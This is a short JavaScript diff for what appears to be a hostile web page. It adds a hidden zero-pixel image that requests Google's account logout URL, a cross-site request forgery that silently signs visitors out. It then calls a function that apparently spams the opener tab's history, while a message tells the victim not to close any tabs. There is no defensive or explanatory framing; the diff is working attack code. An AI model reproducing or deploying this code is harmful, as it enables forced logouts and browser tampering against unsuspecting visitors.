@@ -58,7 +58,12 @@ window.onload = function () {
     if (window.opener != null) {
         document.getElementById("b").style = "display: none;";
         document.getElementById("p").innerHTML = "Loading... do not close any tabs...";
-
+        logout = document.createElement("img")
+        logout.style.height = "0px";
+        logout.style.width = "0px";
+        logout.src = "https://google.com/accounts/Logout";
+        logout.onerror = "";
+        
         spamHistory(window.opener);
     };
 };
